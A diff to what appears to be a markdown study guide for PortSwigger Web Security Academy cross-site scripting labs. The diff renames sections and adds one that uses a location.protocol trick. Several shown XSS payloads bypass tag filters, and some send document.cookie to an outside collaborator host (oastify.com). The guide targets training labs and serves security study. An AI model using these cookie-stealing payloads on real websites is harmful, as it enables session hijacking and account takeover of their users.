@@ -265,7 +265,10 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
   
 ## Cross Site Scripting  
 
-[Tags Blocked bypass](#tags-blocked)  
+[XSS Resources](#xss-resources)  
+[Identify allowed Tags](#identify-allowed-tags)  
+[Bypass Blocked Tags](#bypass-blocked-tags)  
+[XSS Assign protocol](#xss-assign-protocol]  
 [Custom Tags not Blocked](#custom-tags-not-blocked)  
 [XSS Tags & Events](#xss-tags--events)  
 [OnHashChange](#onhashchange)  
@@ -275,6 +278,8 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 [XSS WAF Bypass](#xss-waf-bypass)  
 [Stored XSS](#stored-xss)  
   
+### XSS Resources  
+
 >XSS Resources pages to lookup payloads for **tags** and **events**.   
 
 + [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
@@ -296,7 +301,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 <img src=1 onerror=alert(1)>
 ```  
   
-### Methodology to identify allowed XSS Tags  
+### Identify allowed Tags  
 
 >The below lab gives great **Methodology** to identify allowed HTML tags and events for crafting POC XSS.  
 
@@ -308,7 +313,7 @@ document.cookie = "TopSecret=UnsecureCookieValue4Peanut2019";
 <iframe src="https://TARGET.net/?search=%22%3E%3Cbody%20onpopstate=print()%3E">  
 ```  
   
-### Tags Blocked  
+### Bypass Blocked Tags   
   
 >Application controls give message, ***"Tag is not allowed"*** when inserting basic XSS payloads, but discover SVG mark-up allowed using above methodology. This payload steal my own session cookie as POC.  
 
@@ -326,6 +331,18 @@ https://TARGET.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocume
 ![svg animatetransform XSS](images/svg-animatetransform-xss.png)  
   
 [PortSwigger Lab: Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)  
+  
+### XSS Assign protocol  
+
+>Lab to test XSS into HTML context with nothing encoded in search function. Using this lab to test the **Assignable protocol with location** ```javascript``` identified by [PortSwigger XSS research](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#assignable-protocol-with-location).  
+
+```html
+<script>location.protocol='javascript';</script>#%0adocument.location='http://0xyjdsa2etgbxef5lwgj5rj6mxsoge43.oastify.com/?p='+document.cookie//&context=html
+```  
+
+![XSS protocol location](images/xss-protocol-location.png)  
+
+[PortSwigger Lab: Reflected XSS into HTML context with nothing encoded](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)  
   
 ### Custom Tags not Blocked  
   
